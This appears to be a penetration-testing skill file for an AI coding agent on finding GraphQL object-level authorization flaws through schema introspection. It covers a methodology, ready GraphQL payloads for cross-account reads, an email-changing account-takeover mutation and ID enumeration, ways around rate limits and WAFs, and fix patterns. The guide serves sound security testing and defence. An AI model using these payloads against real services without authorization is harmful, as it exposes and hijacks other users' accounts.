---
name: graphql-idor-via-introspection-leak
description: Covers object-level authorization bypass in GraphQL APIs where introspection reveals hidden fields or mutations that accept arbitrary user/resource IDs without ownership checks. Trigger on keywords like "GraphQL", "query", "mutation", "introspection", "resolver", "node ID", "relay", "object type", "schema", "batching", or "alias". Applies to dual-stack REST+GraphQL apps, Relay-style global IDs, and unauthenticated resolvers.
license: MIT
compatibility: Designed for Claude Code. Burp Suite, Insomnia, or GraphQL Voyager recommended.
metadata:
  category: api
  version: "0.1"
  source: original
  source_types: manual
---

# GraphQL IDOR via Introspection Leak Hunting

## What Is Broken and Why

GraphQL resolvers often receive an `id` argument supplied by the client but fail to verify that the authenticated user owns the referenced object. Authorization is typically implemented at the HTTP middleware layer (REST-style) and never propagated down to individual resolvers — creating a gap when GraphQL is bolted on later. Introspection leaks the full schema, letting an attacker enumerate every query and mutation that accepts an ID argument, then systematically probe each one for missing ownership checks.

## Key Signals

- Introspection not disabled — `__schema` returns data in production
- `id` arguments typed as `ID!` or `String!` with no documented ownership constraint
- Objects expose sensitive fields (PII, tokens, internal metadata) retrievable by bare ID
- App uses Relay global IDs (base64-encoded `TypeName:uuid`) — trivially enumerable
- Error messages like `"Not found"` vs `"Forbidden"` reveal object existence (oracle)
- Batching enabled — can enumerate hundreds of IDs in one request without rate limiting
- Dual-stack architecture (REST + GraphQL) where REST has authz middleware but GraphQL resolvers were added later

## Methodology

1. **Discover the endpoint** — probe `/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`
2. **Run introspection** — dump the full schema
3. **Identify object types with ID args** — look for queries/mutations accepting `id`, `userId`, `resourceId`, `ownerId`
4. **Create two test accounts** — Account A (attacker) and Account B (victim)
5. **Grab a victim resource ID** — note an object ID owned by Account B
6. **Query as attacker** — from Account A's session, call the resolver with Account B's ID
7. **Test mutations too** — attempt `update`, `delete`, `transfer` mutations with cross-account IDs
8. **Test unauthenticated** — remove session token entirely; some resolvers skip auth at the GraphQL layer
9. **Confirm impact** — verify you can read, modify, or delete data you don't own

## Payloads & Tools

**Full introspection dump:**
```graphql
{ __schema { types { name fields { name args { name type { name kind ofType { name } } } } } } }
```

**Targeted type introspection:**
```graphql
{ __type(name: "User") { fields { name type { name kind } } } }
```

**Cross-account read:**
```graphql
{ user(id: "VICTIM_ID") { email phone internalNotes } }
```

**Cross-account mutation:**
```graphql
mutation { updateUserEmail(userId: "VICTIM_ID", newEmail: "attacker@evil.com") { success } }
```

**Relay node interface probe:**
```graphql
{ node(id: "VXNlcjoxMjM0") { ... on User { email phone } } }
```
Decode/re-encode: `echo -n "User:1234" | base64` → `VXNlcjoxMjM0`

**Alias batching for enumeration:**
```graphql
{
  a1: user(id: "001") { email }
  a2: user(id: "002") { email }
  a3: user(id: "003") { email }
}
```

**Tools:** InQL (Burp extension) for schema visualization; GraphQL Voyager for graph traversal; `graphql-cop` for automated security checks; `clairvoyance` for introspection-blocked schema reconstruction.

## Bypass Techniques

- **Alias batching** — 100 ID lookups in one request, bypassing per-request rate limits
- **Type confusion** — integers: try sequential enumeration; UUIDs: check for Relay base64 encoding
- **Fragment reuse** — use fragments to reduce query size and evade WAF pattern matching
- **Mutation chaining** — chain read + mutation atomically to exfiltrate and modify in one request
- **Variable injection** — move IDs into GraphQL variables instead of inline literals to bypass naive input filters
- **Persisted queries** — if the app supports persisted query IDs, find a stored query that skips authz
- **Field aliasing on introspection-blocked endpoints** — try `{a:__schema{...}}` if unaliased introspection is blocked

## Exploitation Scenarios

### Scenario 1 — Invoice Read IDOR
Setup: Invoicing app exposes `getInvoice(id: ID!)`. Introspection shows it returns `amount`, `clientEmail`, `lineItems`. → Trigger: Account A queries with Account B's invoice ID. → Impact: Full invoice details returned. Authorization enforced only on legacy REST route.

### Scenario 2 — Mutation-Based Account Takeover
Setup: SaaS platform has `updateUserEmail(userId: ID!, newEmail: String!)`. Resolver validates session is authenticated but not that `userId` matches the session user. → Trigger: Attacker calls mutation with victim's `userId`. → Impact: Email changed, password reset completes account takeover.

### Scenario 3 — Unauthenticated Relay Node Leak
Setup: App using Relay exposes `node(id: ID!)`. Global IDs are base64-encoded (`User:1234`). No authentication guard on resolver. → Trigger: Unauthenticated attacker decodes and re-encodes sequential IDs. → Impact: Names, emails, profile photos for all registered users without a session.

## False Positives

- Introspection returns schema but all resolvers enforce ownership — confirm by actually crossing account boundaries
- `id` argument present but resolver reads the ID from session context, ignoring the supplied value
- `"Not found"` returned for both valid and invalid cross-account IDs — no oracle, no leak
- Relay `node(id:)` returns data but only for public/non-sensitive types (e.g. public posts)

## Fix Patterns

```js
// WRONG: resolver trusts client-supplied ID
async getInvoice(_, { id }, { db }) {
  return db.invoices.findById(id);
}

// CORRECT: enforce ownership in the query
async getInvoice(_, { id }, { db, currentUser }) {
  const invoice = await db.invoices.findOne({ id, ownerId: currentUser.id });
  if (!invoice) throw new ForbiddenError("Not authorized");
  return invoice;
}
```

- Disable introspection in production (or restrict to authenticated/internal users only)
- Apply authorization at the **resolver level**, not just at the HTTP middleware layer
- Never trust client-supplied IDs — always scope DB queries to the authenticated user's context
- Use a dedicated authorization layer (e.g. graphql-shield, OPA) applied uniformly across all resolvers
- Treat GraphQL as a separate attack surface from REST even when they share the same database

## Related Skills

[[bola-idor]] is the underlying vulnerability that introspection exposes paths to find — introspection maps the schema while BOLA methodology validates each resolver for missing ownership checks. The general [[authz-bypass]] technique of replaying requests with a different session applies directly: enumerate types via introspection, then replay with Account B's session using Account A's object IDs. Introspection-disabled APIs can still be partially reconstructed using clairvoyance, mirroring the reconnaissance role of [[web-fingerprinting]] for REST targets.
